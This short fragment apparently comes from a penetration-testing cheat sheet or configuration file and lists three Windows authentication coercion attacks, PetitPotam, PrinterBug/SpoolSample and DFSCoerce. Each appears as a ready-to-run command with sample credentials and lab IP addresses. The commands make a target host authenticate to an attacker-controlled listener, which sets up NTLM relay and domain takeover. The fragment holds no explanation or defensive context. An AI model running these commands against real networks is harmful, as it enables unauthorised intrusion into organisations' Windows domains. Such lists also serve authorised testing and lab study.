...
command: |
  ...
  python3 PetitPotam.py -u john -p password123 -d test.local 10.10.14.1 10.10.10.1

  # PrinterBug / SpoolSample
  python3 printerbug.py test.local/john:password123@10.10.10.1 10.10.14.1

  # DFSCoerce
  python3 dfscoerce.py -u john -p password123 -d test.local 10.10.14.1 10.10.10.1
